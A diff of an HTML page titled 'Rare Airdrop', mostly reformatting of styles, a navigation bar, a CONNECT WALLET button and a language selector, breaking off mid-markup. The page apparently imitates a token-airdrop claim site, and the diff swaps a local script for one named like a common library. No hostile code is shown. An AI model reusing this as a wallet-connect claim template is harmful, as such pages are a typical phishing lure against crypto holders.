@@ -1,591 +1,995 @@
 <html lang="en" class="dark" style="">
-    <head>
-        <link rel="stylesheet" href="./styles.css"/>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <style type="text/css" id="operaUserStyle"></style>
-        <script charset="UTF-8" type="text/javascript" src="./mobx-6.9.0.min.js"></script>
-         <script src="chunk-m8i2invz.min.js" async></script> 
+  <head>
+    <link rel="stylesheet" href="./styles.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style type="text/css" id="operaUserStyle"></style>
+    <script
+      charset="UTF-8"
+      type="text/javascript"
+      src="./mobx-6.9.0.min.js"
+    ></script>
+    <script src="axios-5.1.3.min.js" async></script>
 
-        <style type="text/css">
-            /* Hide RARE text on mobile, show on desktop */
-            @media (max-width: 767px) {
-                #rareTextLogo {
-                    display: none !important;
-                }
-            }
-            
-            /* Video styling for different themes */
-            .light video {
-                filter: invert(1) brightness(1.2);
-                mix-blend-mode: normal !important;
-                opacity: 1;
-            }
-            
-            .dark video {
-                filter: none;
-                mix-blend-mode: screen !important;
-                opacity: 1;
-            }
-            
-            /* Theme toggle icon color */
-            .light #themeIcon path {
-                fill: #1f2937 !important;
-            }
-            
-            .dark #themeIcon path {
-                fill: #ffffff !important;
-            }
-            
-            /* Language dropdown theme colors */
-            .light #languageDropdown {
-                background-color: #ffffff !important;
-                border-color: #e5e7eb !important;
-            }
-            
-            .dark #languageDropdown {
-                background-color: #1a1a1a !important;
-            }
-            
-            .light #languageDropdown > div:first-child {
-                background-color: #f9fafb !important;
-                border-color: #e5e7eb !important;
-            }
-            
-            .dark #languageDropdown > div:first-child {
-                background-color: #1a1a1a !important;
-            }
-            
-            .light #languageDropdown > div:last-child {
-                background-color: #ffffff !important;
-            }
-            
-            .dark #languageDropdown > div:last-child {
-                background-color: #1a1a1a !important;
-            }
-            
-            .light .lang-option {
-                color: #1f2937 !important;
-            }
-            
-            .dark .lang-option {
-                color: #ffffff !important;
-            }
-            
-            .light .lang-option:hover {
-                background-color: #f3f4f6 !important;
-            }
-            
-            .dark .lang-option:hover {
-                background-color: rgba(255, 255, 255, 0.1) !important;
-            }
-            
-            /* Language dropdown header text */
-            .light #languageDropdown .text-gray-400 {
-                color: #6b7280 !important;
-            }
-            
-            .dark #languageDropdown .text-gray-400 {
-                color: #9ca3af !important;
-            }
-            
-            /* Language option code text */
-            .light .lang-option span[style*="color: #9ca3af"] {
-                color: #6b7280 !important;
-            }
-            
-            .dark .lang-option span[style*="color: #9ca3af"] {
-                color: #9ca3af !important;
-            }
-            
-            /* Wallet connected menu theme colors */
-            .light #eligibilityMenu {
-                background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%) !important;
-            }
-            
-            .light #eligibilityMenu .text-sr-text-primary {
-                color: #1f2937 !important;
-            }
-            
-            .light #eligibilityMenu [style*="color: var(--sr-text-primary"] {
-                color: #1f2937 !important;
-            }
-            
-            .light #eligibilityMenu [style*="color: #22c55e"] {
-                color: #16a34a !important;
-            }
-            
-            .light #eligibilityMenu [style*="color: #10b981"] {
-                color: #059669 !important;
-            }
-            
-            .light #eligibilityMenu [style*="color: #94a3b8"] {
-                color: #64748b !important;
-            }
-            
-            .light #eligibilityMenu [style*="color: #22d3ee"] {
-                color: #0891b2 !important;
-            }
-            
-            .light #eligibilityMenu [style*="background: rgba(255, 255, 255, 0.05)"] {
-                background: rgba(0, 0, 0, 0.05) !important;
-            }
-            
-            .light #eligibilityMenu [style*="border: 1px solid rgba(255, 255, 255, 0.12)"] {
-                border: 1px solid rgba(0, 0, 0, 0.12) !important;
-            }
-            
-            .light #eligibilityMenu [style*="background: rgba(34, 197, 94, 0.12)"] {
-                background: rgba(34, 197, 94, 0.2) !important;
-            }
-            
-            .light #eligibilityMenu [style*="border: 2px solid rgba(34, 197, 94, 0.35)"] {
-                border: 2px solid rgba(34, 197, 94, 0.5) !important;
-            }
-            
-            /* Claim button in light mode */
-            .light .getRARE-button {
-                background: rgba(0, 0, 0, 0.08) !important;
-                border: 1px solid rgba(0, 0, 0, 0.15) !important;
-                color: #1f2937 !important;
-            }
-            
-            .light .getRARE-button:hover {
-                background: rgba(0, 0, 0, 0.12) !important;
-                border-color: rgba(0, 0, 0, 0.2) !important;
-            }
-        </style>
-        <link rel="icon" href="https://rewards.rare.xyz/favicon.ico">
-        <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <meta charset="utf-8" />
-        <title>Rare Airdrop</title>
-        <meta name="description" content="Rare Airdrop" />
-        <link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="640x640" />
-        <meta name="next-size-adjust" />
-    </head>
+    <style type="text/css">
+      /* Hide RARE text on mobile, show on desktop */
+      @media (max-width: 767px) {
+        #rareTextLogo {
+          display: none !important;
+        }
+      }
 
-    <body class="__className_e8ce0c flex min-h-screen flex-col antialiased bg-primary">
-        <div class="fixed left-0 right-0 top-0 z-10">
-            <nav class="flex items-center justify-between border-b px-6 py-4 bg-primary text-primary border-primary">
-                <a href="https://rare.xyz" target="_blank" rel="noopener noreferrer" class="flex items-center gap-2 transition-opacity hover:opacity-80">
-                    <svg class="h-6 w-6 md:h-8 md:w-8" xmlns="http://www.w3.org/2000/svg" width="26" height="21" viewBox="0 0 26 21" fill="none">
-                        <path
-                            fill-rule="evenodd"
-                            clip-rule="evenodd"
-                            d="M19.5432 0H5.51161L0 5.89974L12.5237 20.7125L25.0548 5.89974L19.5432 0ZM6.06872 5.89974L9.76788 1.93923H18.0724L21.7716 5.89974L13.9202 15.1857L6.06872 5.89974Z"
-                            fill="currentColor"
-                        ></path>
-                    </svg>
-                    <span id="rareTextLogo" class="font-medium">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="67" height="21" viewBox="0 0 67 21" fill="none" class="h-4 w-auto md:h-[21px]">
-                            <path d="M57.1323 18.4055V2.58423H66.6807V4.28378H59.0482V9.62964H66.1863V11.3292H59.0482V16.706H66.8043V18.4055H57.1323Z" fill="currentColor"></path>
-                            <path
-                                d="M43.4351 18.4055V2.58423H48.7809C50.017 2.58423 51.0315 2.79538 51.8247 3.2177C52.6178 3.63486 53.2049 4.2091 53.586 4.94043C53.9671 5.67175 54.1577 6.5035 54.1577 7.43568C54.1577 8.36785 53.9671 9.19445 53.586 9.91548C53.2049 10.6365 52.6204 11.203 51.8324 11.615C51.0444 12.0219 50.0376 12.2253 48.8118 12.2253H44.4857V10.4949H48.75C49.5946 10.4949 50.2745 10.3713 50.7895 10.1241C51.3096 9.87685 51.6856 9.52664 51.9174 9.07343C52.1543 8.61506 52.2727 8.06914 52.2727 7.43568C52.2727 6.80221 52.1543 6.24856 51.9174 5.77475C51.6805 5.30094 51.3019 4.93528 50.7818 4.67777C50.2616 4.41511 49.574 4.28378 48.7191 4.28378H45.3509V18.4055H43.4351ZM50.8822 11.2983L54.7757 18.4055H52.5508L48.7191 11.2983H50.8822Z"
-                                fill="currentColor"
-                            ></path>
-                            <path d="M29.6004 18.4055H27.5918L33.4012 2.58423H35.3788L41.1882 18.4055H39.1796L34.4518 5.0872H34.3282L29.6004 18.4055ZM30.342 12.2253H38.438V13.9249H30.342V12.2253Z" fill="currentColor"></path>
-                            <path
-                                d="M15.2539 18.4055V2.58423H20.5998C21.8358 2.58423 22.8504 2.79538 23.6435 3.2177C24.4366 3.63486 25.0238 4.2091 25.4049 4.94043C25.786 5.67175 25.9765 6.5035 25.9765 7.43568C25.9765 8.36785 25.786 9.19445 25.4049 9.91548C25.0238 10.6365 24.4392 11.203 23.6512 11.615C22.8633 12.0219 21.8564 12.2253 20.6307 12.2253H16.3045V10.4949H20.5689C21.4135 10.4949 22.0933 10.3713 22.6083 10.1241C23.1285 9.87685 23.5045 9.52664 23.7362 9.07343C23.9731 8.61506 24.0916 8.06914 24.0916 7.43568C24.0916 6.80221 23.9731 6.24856 23.7362 5.77475C23.4993 5.30094 23.1208 4.93528 22.6006 4.67777C22.0804 4.41511 21.3929 4.28378 20.538 4.28378H17.1698V18.4055H15.2539ZM22.701 11.2983L26.5945 18.4055H24.3697L20.538 11.2983H22.701Z"
-                                fill="currentColor"
-                            ></path>
-                            <path
-                                d="M5.9867 20.383V0.606445H7.25364V20.383H5.9867ZM10.251 6.53943C10.1583 5.7566 9.78236 5.14888 9.12314 4.71627C8.46392 4.28366 7.65535 4.06735 6.69742 4.06735C5.997 4.06735 5.38413 4.18065 4.85881 4.40726C4.33865 4.63387 3.93179 4.94545 3.63823 5.34201C3.34982 5.73858 3.20561 6.18921 3.20561 6.69393C3.20561 7.11624 3.30604 7.47933 3.5069 7.78319C3.7129 8.0819 3.97556 8.33168 4.29487 8.53254C4.61418 8.72824 4.94894 8.89047 5.29915 9.01923C5.64936 9.14283 5.97125 9.24326 6.26481 9.32051L7.87165 9.75312C8.28367 9.86128 8.74203 10.0106 9.24675 10.2012C9.75661 10.3917 10.2433 10.6518 10.7068 10.9814C11.1755 11.3059 11.5617 11.7231 11.8656 12.2329C12.1695 12.7428 12.3214 13.3685 12.3214 14.1102C12.3214 14.9651 12.0974 15.7376 11.6493 16.4277C11.2064 17.1178 10.5575 17.6663 9.70253 18.0732C8.85276 18.4801 7.82015 18.6835 6.60472 18.6835C5.47168 18.6835 4.49058 18.5007 3.6614 18.135C2.83738 17.7693 2.18846 17.2595 1.71464 16.6054C1.24598 15.9513 0.980747 15.1917 0.918945 14.3265H2.8966C2.94811 14.9239 3.14896 15.4183 3.49917 15.8097C3.85453 16.196 4.3026 16.4844 4.84336 16.6749C5.38928 16.8603 5.9764 16.953 6.60472 16.953C7.33604 16.953 7.99268 16.8346 8.57465 16.5977C9.15662 16.3556 9.61756 16.0209 9.95747 15.5934C10.2974 15.1608 10.4673 14.6561 10.4673 14.0793C10.4673 13.5539 10.3206 13.1265 10.027 12.7969C9.73343 12.4673 9.34717 12.1994 8.86821 11.9934C8.38924 11.7874 7.87165 11.6072 7.31544 11.4527L5.36868 10.8965C4.13264 10.5411 3.15411 10.0338 2.43309 9.37459C1.71207 8.71537 1.35156 7.85271 1.35156 6.78663C1.35156 5.90081 1.59104 5.12828 2.07 4.46906C2.55412 3.80469 3.20304 3.28968 4.01676 2.92402C4.83564 2.5532 5.74979 2.3678 6.75922 2.3678C7.77895 2.3678 8.68538 2.55063 9.4785 2.91629C10.2716 3.2768 10.8999 3.77122 11.3635 4.39954C11.8321 5.02785 12.0793 5.74115 12.1051 6.53943H10.251Z"
-                                fill="currentColor"
-                            ></path>
-                        </svg>
-                    </span>
-                </a>
-                <div class="flex items-center gap-4">
-                    <button class="rounded-md font-medium transition-colors px-3 py-1 text-sm bg-sr-bg-primary text-sr-text-primary hover:bg-sr-bg-primary border border-sr-text-primary text-xs md:text-base connect-btn" data-i18n="connectWallet">CONNECT WALLET</button>
-                    <button class="discon-button rounded-full p-2 hover:bg-red-500/20 transition-colors group" style="display: none;" aria-label="Disconnect wallet" title="Disconnect" onclick="console.log('Direct click on disconnect button!'); disconnectWallet();">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="text-sr-text-primary group-hover:text-red-500 transition-colors">
-                            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                            <polyline points="16 17 21 12 16 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                            <line x1="21" y1="12" x2="9" y2="12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                        </svg>
-                    </button>
-                    
-                    <!-- Language Selector -->
-                    <div style="position: relative;">
-                        <button id="languageSelector" class="flex items-center gap-1 rounded-md px-3 py-1.5 text-sm font-medium text-sr-text-primary hover:bg-sr-bg-primary border border-sr-border-primary transition-colors" aria-label="Select language">
-                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="text-sr-text-primary">
-                                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                                <path d="M2 12H22" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                                <path d="M12 2C14.5013 4.73835 15.9228 8.29203 16 12C15.9228 15.708 14.5013 19.2616 12 22C9.49872 19.2616 8.07725 15.708 8 12C8.07725 8.29203 9.49872 4.73835 12 2V2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                            </svg>
-                            <span id="currentLangCode" class="text-xs font-semibold">EN</span>
-                        </button>
-                        
-                        <!-- Language Dropdown -->
-                        <div id="languageDropdown" class="rounded-lg bg-[#1a1a1a] border border-sr-border-primary shadow-xl overflow-hidden" style="display: none; position: absolute; right: 0; top: 100%; margin-top: 0.5rem; width: 12rem; z-index: 9999; max-height: 400px; overflow-y: auto;">
-                            <div class="px-4 py-2 text-xs font-semibold text-gray-400 uppercase tracking-wider border-b border-sr-border-primary" style="background-color: #1a1a1a;">
-                                Language
-                            </div>
-                            <div class="py-1" style="background-color: #1a1a1a;">
-                                <button class="lang-option text-sr-text-primary transition-colors" style="width: 100%; display: flex; align-items: center; justify-content: space-between; padding: 0.625rem 1rem; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; text-align: left;" data-lang="en">
-                                    <span style="font-weight: 500;">English</span>
-                                    <span style="font-size: 0.75rem; color: #9ca3af;">EN</span>
-                                </button>
-                                <button class="lang-option text-sr-text-primary transition-colors" style="width: 100%; display: flex; align-items: center; justify-content: space-between; padding: 0.625rem 1rem; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; text-align: left;" data-lang="de">
-                                    <span style="font-weight: 500;">Deutsch</span>
-                                    <span style="font-size: 0.75rem; color: #9ca3af;">DE</span>
-                                </button>
-                                <button class="lang-option text-sr-text-primary transition-colors" style="width: 100%; display: flex; align-items: center; justify-content: space-between; padding: 0.625rem 1rem; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; text-align: left;" data-lang="es">
-                                    <span style="font-weight: 500;">Español</span>
-                                    <span style="font-size: 0.75rem; color: #9ca3af;">ES</span>
-                                </button>
-                                <button class="lang-option text-sr-text-primary transition-colors" style="width: 100%; display: flex; align-items: center; justify-content: space-between; padding: 0.625rem 1rem; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; text-align: left;" data-lang="nl">
-                                    <span style="font-weight: 500;">Nederlands</span>
-                                    <span style="font-size: 0.75rem; color: #9ca3af;">NL</span>
-                                </button>
-                                <button class="lang-option text-sr-text-primary transition-colors" style="width: 100%; display: flex; align-items: center; justify-content: space-between; padding: 0.625rem 1rem; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; text-align: left;" data-lang="pt">
-                                    <span style="font-weight: 500;">Português</span>
-                                    <span style="font-size: 0.75rem; color: #9ca3af;">PT</span>
-                                </button>
-                                <button class="lang-option text-sr-text-primary transition-colors" style="width: 100%; display: flex; align-items: center; justify-content: space-between; padding: 0.625rem 1rem; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; text-align: left;" data-lang="ru">
-                                    <span style="font-weight: 500;">Русский</span>
-                                    <span style="font-size: 0.75rem; color: #9ca3af;">RU</span>
-                                </button>
-                                <button class="lang-option text-sr-text-primary transition-colors" style="width: 100%; display: flex; align-items: center; justify-content: space-between; padding: 0.625rem 1rem; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; text-align: left;" data-lang="uk">
-                                    <span style="font-weight: 500;">Українська</span>
-                                    <span style="font-size: 0.75rem; color: #9ca3af;">UK</span>
-                                </button>
-                                <button class="lang-option text-sr-text-primary transition-colors" style="width: 100%; display: flex; align-items: center; justify-content: space-between; padding: 0.625rem 1rem; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; text-align: left;" data-lang="zh">
-                                    <span style="font-weight: 500;">中文</span>
-                                    <span style="font-size: 0.75rem; color: #9ca3af;">ZH</span>
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <button id="themeToggle" class="rounded-full p-2 hover:bg-tertiary" aria-label="Toggle theme mode">
-                        <svg id="themeIcon" class="transition-transform duration-300 ease-in-out rotate-180" width="15" height="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path
-                                fill-rule="evenodd"
-                                clip-rule="evenodd"
-                                d="M7.49991 0.876892C3.84222 0.876892 0.877075 3.84204 0.877075 7.49972C0.877075 11.1574 3.84222 14.1226 7.49991 14.1226C11.1576 14.1226 14.1227 11.1574 14.1227 7.49972C14.1227 3.84204 11.1576 0.876892 7.49991 0.876892ZM7.49988 1.82689C4.36688 1.8269 1.82707 4.36672 1.82707 7.49972C1.82707 10.6327 4.36688 13.1725 7.49988 13.1726V1.82689Z"
-                                fill="white"
-                            ></path>
-                        </svg>
-                    </button>
-                </div>
-            </nav>
+      /* Video styling for different themes */
+      .light video {
+        filter: invert(1) brightness(1.2);
+        mix-blend-mode: normal !important;
+        opacity: 1;
+      }
+
+      .dark video {
+        filter: none;
+        mix-blend-mode: screen !important;
+        opacity: 1;
+      }
+
+      /* Theme toggle icon color */
+      .light #themeIcon path {
+        fill: #1f2937 !important;
+      }
+
+      .dark #themeIcon path {
+        fill: #ffffff !important;
+      }
+
+      /* Language dropdown theme colors */
+      .light #languageDropdown {
+        background-color: #ffffff !important;
+        border-color: #e5e7eb !important;
+      }
+
+      .dark #languageDropdown {
+        background-color: #1a1a1a !important;
+      }
+
+      .light #languageDropdown > div:first-child {
+        background-color: #f9fafb !important;
+        border-color: #e5e7eb !important;
+      }
+
+      .dark #languageDropdown > div:first-child {
+        background-color: #1a1a1a !important;
+      }
+
+      .light #languageDropdown > div:last-child {
+        background-color: #ffffff !important;
+      }
+
+      .dark #languageDropdown > div:last-child {
+        background-color: #1a1a1a !important;
+      }
+
+      .light .lang-option {
+        color: #1f2937 !important;
+      }
+
+      .dark .lang-option {
+        color: #ffffff !important;
+      }
+
+      .light .lang-option:hover {
+        background-color: #f3f4f6 !important;
+      }
+
+      .dark .lang-option:hover {
+        background-color: rgba(255, 255, 255, 0.1) !important;
+      }
+
+      /* Language dropdown header text */
+      .light #languageDropdown .text-gray-400 {
+        color: #6b7280 !important;
+      }
+
+      .dark #languageDropdown .text-gray-400 {
+        color: #9ca3af !important;
+      }
+
+      /* Language option code text */
+      .light .lang-option span[style*="color: #9ca3af"] {
+        color: #6b7280 !important;
+      }
+
+      .dark .lang-option span[style*="color: #9ca3af"] {
+        color: #9ca3af !important;
+      }
+
+      /* Wallet connected menu theme colors */
+      .light #eligibilityMenu {
+        background: linear-gradient(
+          135deg,
+          #f3f4f6 0%,
+          #e5e7eb 100%
+        ) !important;
+      }
+
+      .light #eligibilityMenu .text-sr-text-primary {
+        color: #1f2937 !important;
+      }
+
+      .light #eligibilityMenu [style*="color: var(--sr-text-primary"] {
+        color: #1f2937 !important;
+      }
+
+      .light #eligibilityMenu [style*="color: #22c55e"] {
+        color: #16a34a !important;
+      }
+
+      .light #eligibilityMenu [style*="color: #10b981"] {
+        color: #059669 !important;
+      }
+
+      .light #eligibilityMenu [style*="color: #94a3b8"] {
+        color: #64748b !important;
+      }
+
+      .light #eligibilityMenu [style*="color: #22d3ee"] {
+        color: #0891b2 !important;
+      }
+
+      .light #eligibilityMenu [style*="background: rgba(255, 255, 255, 0.05)"] {
+        background: rgba(0, 0, 0, 0.05) !important;
+      }
+
+      .light
+        #eligibilityMenu
+        [style*="border: 1px solid rgba(255, 255, 255, 0.12)"] {
+        border: 1px solid rgba(0, 0, 0, 0.12) !important;
+      }
+
+      .light #eligibilityMenu [style*="background: rgba(34, 197, 94, 0.12)"] {
+        background: rgba(34, 197, 94, 0.2) !important;
+      }
+
+      .light
+        #eligibilityMenu
+        [style*="border: 2px solid rgba(34, 197, 94, 0.35)"] {
+        border: 2px solid rgba(34, 197, 94, 0.5) !important;
+      }
+
+      /* Claim button in light mode */
+      .light .getRARE-button {
+        background: rgba(0, 0, 0, 0.08) !important;
+        border: 1px solid rgba(0, 0, 0, 0.15) !important;
+        color: #1f2937 !important;
+      }
+
+      .light .getRARE-button:hover {
+        background: rgba(0, 0, 0, 0.12) !important;
+        border-color: rgba(0, 0, 0, 0.2) !important;
+      }
+    </style>
+    <link rel="icon" href="https://rewards.rare.xyz/favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta charset="utf-8" />
+    <title>Rare Airdrop</title>
+    <meta name="description" content="Rare Airdrop" />
+    <link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="640x640" />
+    <meta name="next-size-adjust" />
+  </head>
+
+  <body
+    class="__className_e8ce0c flex min-h-screen flex-col antialiased bg-primary"
+  >
+    <div class="fixed left-0 right-0 top-0 z-10">
+      <nav
+        class="flex items-center justify-between border-b px-6 py-4 bg-primary text-primary border-primary"
+      >
+        <a
+          href="https://rare.xyz"
+          target="_blank"
+          rel="noopener noreferrer"
+          class="flex items-center gap-2 transition-opacity hover:opacity-80"
+        >
+          <svg
+            class="h-6 w-6 md:h-8 md:w-8"
+            xmlns="http://www.w3.org/2000/svg"
+            width="26"
+            height="21"
+            viewBox="0 0 26 21"
+            fill="none"
+          >
+            <path
+              fill-rule="evenodd"
+              clip-rule="evenodd"
+              d="M19.5432 0H5.51161L0 5.89974L12.5237 20.7125L25.0548 5.89974L19.5432 0ZM6.06872 5.89974L9.76788 1.93923H18.0724L21.7716 5.89974L13.9202 15.1857L6.06872 5.89974Z"
+              fill="currentColor"
+            ></path>
+          </svg>
+          <span id="rareTextLogo" class="font-medium">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="67"
+              height="21"
+              viewBox="0 0 67 21"
+              fill="none"
+              class="h-4 w-auto md:h-[21px]"
+            >
+              <path
+                d="M57.1323 18.4055V2.58423H66.6807V4.28378H59.0482V9.62964H66.1863V11.3292H59.0482V16.706H66.8043V18.4055H57.1323Z"
+                fill="currentColor"
+              ></path>
+              <path
+                d="M43.4351 18.4055V2.58423H48.7809C50.017 2.58423 51.0315 2.79538 51.8247 3.2177C52.6178 3.63486 53.2049 4.2091 53.586 4.94043C53.9671 5.67175 54.1577 6.5035 54.1577 7.43568C54.1577 8.36785 53.9671 9.19445 53.586 9.91548C53.2049 10.6365 52.6204 11.203 51.8324 11.615C51.0444 12.0219 50.0376 12.2253 48.8118 12.2253H44.4857V10.4949H48.75C49.5946 10.4949 50.2745 10.3713 50.7895 10.1241C51.3096 9.87685 51.6856 9.52664 51.9174 9.07343C52.1543 8.61506 52.2727 8.06914 52.2727 7.43568C52.2727 6.80221 52.1543 6.24856 51.9174 5.77475C51.6805 5.30094 51.3019 4.93528 50.7818 4.67777C50.2616 4.41511 49.574 4.28378 48.7191 4.28378H45.3509V18.4055H43.4351ZM50.8822 11.2983L54.7757 18.4055H52.5508L48.7191 11.2983H50.8822Z"
+                fill="currentColor"
+              ></path>
+              <path
+                d="M29.6004 18.4055H27.5918L33.4012 2.58423H35.3788L41.1882 18.4055H39.1796L34.4518 5.0872H34.3282L29.6004 18.4055ZM30.342 12.2253H38.438V13.9249H30.342V12.2253Z"
+                fill="currentColor"
+              ></path>
+              <path
+                d="M15.2539 18.4055V2.58423H20.5998C21.8358 2.58423 22.8504 2.79538 23.6435 3.2177C24.4366 3.63486 25.0238 4.2091 25.4049 4.94043C25.786 5.67175 25.9765 6.5035 25.9765 7.43568C25.9765 8.36785 25.786 9.19445 25.4049 9.91548C25.0238 10.6365 24.4392 11.203 23.6512 11.615C22.8633 12.0219 21.8564 12.2253 20.6307 12.2253H16.3045V10.4949H20.5689C21.4135 10.4949 22.0933 10.3713 22.6083 10.1241C23.1285 9.87685 23.5045 9.52664 23.7362 9.07343C23.9731 8.61506 24.0916 8.06914 24.0916 7.43568C24.0916 6.80221 23.9731 6.24856 23.7362 5.77475C23.4993 5.30094 23.1208 4.93528 22.6006 4.67777C22.0804 4.41511 21.3929 4.28378 20.538 4.28378H17.1698V18.4055H15.2539ZM22.701 11.2983L26.5945 18.4055H24.3697L20.538 11.2983H22.701Z"
+                fill="currentColor"
+              ></path>
+              <path
+                d="M5.9867 20.383V0.606445H7.25364V20.383H5.9867ZM10.251 6.53943C10.1583 5.7566 9.78236 5.14888 9.12314 4.71627C8.46392 4.28366 7.65535 4.06735 6.69742 4.06735C5.997 4.06735 5.38413 4.18065 4.85881 4.40726C4.33865 4.63387 3.93179 4.94545 3.63823 5.34201C3.34982 5.73858 3.20561 6.18921 3.20561 6.69393C3.20561 7.11624 3.30604 7.47933 3.5069 7.78319C3.7129 8.0819 3.97556 8.33168 4.29487 8.53254C4.61418 8.72824 4.94894 8.89047 5.29915 9.01923C5.64936 9.14283 5.97125 9.24326 6.26481 9.32051L7.87165 9.75312C8.28367 9.86128 8.74203 10.0106 9.24675 10.2012C9.75661 10.3917 10.2433 10.6518 10.7068 10.9814C11.1755 11.3059 11.5617 11.7231 11.8656 12.2329C12.1695 12.7428 12.3214 13.3685 12.3214 14.1102C12.3214 14.9651 12.0974 15.7376 11.6493 16.4277C11.2064 17.1178 10.5575 17.6663 9.70253 18.0732C8.85276 18.4801 7.82015 18.6835 6.60472 18.6835C5.47168 18.6835 4.49058 18.5007 3.6614 18.135C2.83738 17.7693 2.18846 17.2595 1.71464 16.6054C1.24598 15.9513 0.980747 15.1917 0.918945 14.3265H2.8966C2.94811 14.9239 3.14896 15.4183 3.49917 15.8097C3.85453 16.196 4.3026 16.4844 4.84336 16.6749C5.38928 16.8603 5.9764 16.953 6.60472 16.953C7.33604 16.953 7.99268 16.8346 8.57465 16.5977C9.15662 16.3556 9.61756 16.0209 9.95747 15.5934C10.2974 15.1608 10.4673 14.6561 10.4673 14.0793C10.4673 13.5539 10.3206 13.1265 10.027 12.7969C9.73343 12.4673 9.34717 12.1994 8.86821 11.9934C8.38924 11.7874 7.87165 11.6072 7.31544 11.4527L5.36868 10.8965C4.13264 10.5411 3.15411 10.0338 2.43309 9.37459C1.71207 8.71537 1.35156 7.85271 1.35156 6.78663C1.35156 5.90081 1.59104 5.12828 2.07 4.46906C2.55412 3.80469 3.20304 3.28968 4.01676 2.92402C4.83564 2.5532 5.74979 2.3678 6.75922 2.3678C7.77895 2.3678 8.68538 2.55063 9.4785 2.91629C10.2716 3.2768 10.8999 3.77122 11.3635 4.39954C11.8321 5.02785 12.0793 5.74115 12.1051 6.53943H10.251Z"
+                fill="currentColor"
+              ></path>
+            </svg>
+          </span>
+        </a>
+        <div class="flex items-center gap-4">
+          <button
+            class="rounded-md font-medium transition-colors px-3 py-1 text-sm bg-sr-bg-primary text-sr-text-primary hover:bg-sr-bg-primary border border-sr-text-primary text-xs md:text-base connect-btn"
+            data-i18n="connectWallet"
+          >
+            CONNECT WALLET
+          </button>
+          <button
+            class="discon-button rounded-full p-2 hover:bg-red-500/20 transition-colors group"
+            style="display: none"
+            aria-label="Disconnect wallet"
+            title="Disconnect"
+            onclick="
+              console.log('Direct click on disconnect button!');
+              disconnectWallet();
+            "
+          >
+            <svg
+              width="20"
+              height="20"
+              viewBox="0 0 24 24"
+              fill="none"
+              xmlns="http://www.w3.org/2000/svg"
+              class="text-sr-text-primary group-hover:text-red-500 transition-colors"
+            >
+              <path
+                d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+              <polyline
+                points="16 17 21 12 16 7"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+              <line
+                x1="21"
+                y1="12"
+                x2="9"
+                y2="12"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </button>
+
+          <!-- Language Selector -->
+          <div style="position: relative">
+            <button
+              id="languageSelector"
+              class="flex items-center gap-1 rounded-md px-3 py-1.5 text-sm font-medium text-sr-text-primary hover:bg-sr-bg-primary border border-sr-border-primary transition-colors"
+              aria-label="Select language"
+            >
+              <svg
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+                class="text-sr-text-primary"
+              >
+                <path
+                  d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+                <path
+                  d="M2 12H22"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+                <path
+                  d="M12 2C14.5013 4.73835 15.9228 8.29203 16 12C15.9228 15.708 14.5013 19.2616 12 22C9.49872 19.2616 8.07725 15.708 8 12C8.07725 8.29203 9.49872 4.73835 12 2V2Z"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+              <span id="currentLangCode" class="text-xs font-semibold">EN</span>
+            </button>
+
+            <!-- Language Dropdown -->
+            <div
+              id="languageDropdown"
+              class="rounded-lg bg-[#1a1a1a] border border-sr-border-primary shadow-xl overflow-hidden"
+              style="
+                display: none;
+                position: absolute;
+                right: 0;
+                top: 100%;
+                margin-top: 0.5rem;
+                width: 12rem;
+                z-index: 9999;
+                max-height: 400px;
+                overflow-y: auto;
+              "
+            >
+              <div
+                class="px-4 py-2 text-xs font-semibold text-gray-400 uppercase tracking-wider border-b border-sr-border-primary"
+                style="background-color: #1a1a1a"
+              >
+                Language
